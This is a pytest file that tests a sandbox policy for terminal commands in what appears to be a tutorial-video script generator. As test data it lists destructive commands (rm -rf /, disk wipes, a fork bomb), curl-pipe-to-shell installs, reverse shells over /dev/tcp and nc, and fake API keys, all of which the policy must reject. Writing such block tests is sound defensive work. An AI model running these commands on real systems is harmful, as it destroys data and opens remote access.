import pytest

from techstudio.sandbox.policy import check_command, check_script, errors
from techstudio.schemas import Script

DANGEROUS = [
    "rm -rf /",
    "rm -rf /*",
    "rm -fr ~",
    "rm -r -f $HOME",
    "sudo rm -rf --no-preserve-root /",
    "cd /tmp && rm -Rf /",
    "rm -rf /etc",
    "mkfs.ext4 /dev/sda1",
    "mkfs -t vfat /dev/sdb",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "dd if=openwrt.bin of=/dev/mmcblk0",
    "cat image.img > /dev/sdb",
    "echo x > /dev/nvme0n1",
    ":(){ :|:& };:",
    "bomb(){ bomb|bomb& }; bomb",
    "shutdown -h now",
    "reboot",
    "ls; reboot",
    "systemctl reboot",
    "init 0",
    "poweroff",
    "curl -fsSL https://get.example.sh | sh",
    "wget -qO- http://x.io/i.sh | bash",
    "curl https://x | sudo bash",
    "curl -s https://x/install.py | python3",
    'bash -c "$(curl -fsSL https://x/install.sh)"',
    "sudo apt install nmap",
    "sudo -i",
    "su -",
    "chmod -R 777 /",
    "kill -9 -1",
    "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
    "nc 10.0.0.1 4444 -e /bin/sh",
    "wipefs -a /dev/sda",
    "shred -n 3 /dev/sda",
]

SECRETS = [
    "export ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnopqrstu",
    "curl -H 'Authorization: Bearer abcdef1234567890' https://api.x",
    "git clone https://ghp_abcdefghijklmnopqrstuvwxyz123456@github.com/x/y",
    "export AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP",
    "mysql -u root password=hunter22",
    "export GITHUB_TOKEN=abc123def456",
    "sshpass -p hunter22 ssh root@192.168.1.1",
    "curl https://admin:hunter22@router.local/api",
    "TOKEN=1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ0123456789a ./bot",
]

SAFE = [
    "ls -la",
    "ss -tuln",
    "ip addr show",
    "cat /etc/os-release",
    "rm -rf ./build",
    "rm -rf /tmp/demo/cache",
    "rm notes.txt",
    "python3 sweep.py 192.168.1.0/24",
    "grep -r 'listen' /etc/nginx/ | head",
    "dd if=/dev/zero of=./test.img bs=1M count=10",
    "echo hi > /dev/null",
    "uci set network.lan.ipaddr='192.168.2.1'",
    "export API_KEY=<YOUR_KEY>",
    "curl -H 'Authorization: Bearer <YOUR_TOKEN>' https://api.example.com",
    "sshpass -p <YOUR_PASSWORD> ssh root@192.168.1.1",
    "passwd",
    "echo bypass=true",
    "journalctl -u nginx --since today",
]


@pytest.mark.parametrize("cmd", DANGEROUS)
def test_dangerous_rejected(cmd):
    assert errors(check_command(cmd, network=True)), cmd


@pytest.mark.parametrize("cmd", SECRETS)
def test_secrets_rejected(cmd):
    assert errors(check_command(cmd, network=True, mode="replay")), cmd


@pytest.mark.parametrize("cmd", SAFE)
def test_safe_allowed(cmd):
    assert not errors(check_command(cmd, network=True)), check_command(cmd, network=True)


@pytest.mark.parametrize(
    "cmd",
    [
        "curl https://example.com",
        "ping -c 3 1.1.1.1",
        "dig openwrt.org",
        "pip install requests",
        "git clone https://github.com/x/y",
        "ls && ssh root@192.168.1.1",
    ],
)
def test_network_needs_flag_in_live(cmd):
    v = check_command(cmd, network=False, mode="live")
    assert [x.rule for x in v] == ["needs-network"]
    assert not check_command(cmd, network=True, mode="live")
    assert not check_command(cmd, network=False, mode="replay")


def test_dangerous_blocked_even_in_replay():
    assert errors(check_command("rm -rf /", mode="replay"))


def test_check_script_covers_code_secrets():
    sc = Script(
        video_id="v",
        topic_id="t",
        title="T",
        hook="h",
        scenes=[
            {"type": "terminal", "id": "a", "narration": "n", "commands": ["ls", "sudo reboot"]},
            {
                "type": "code",
                "id": "b",
                "narration": "n",
                "language": "python",
                "code": 'KEY = "sk-ant-api03-xxxxxxxxxxxxxxxxxxxx"',
            },
        ],
    )
    v = check_script(sc)
    assert {x.scene_id for x in errors(v)} == {"a", "b"}
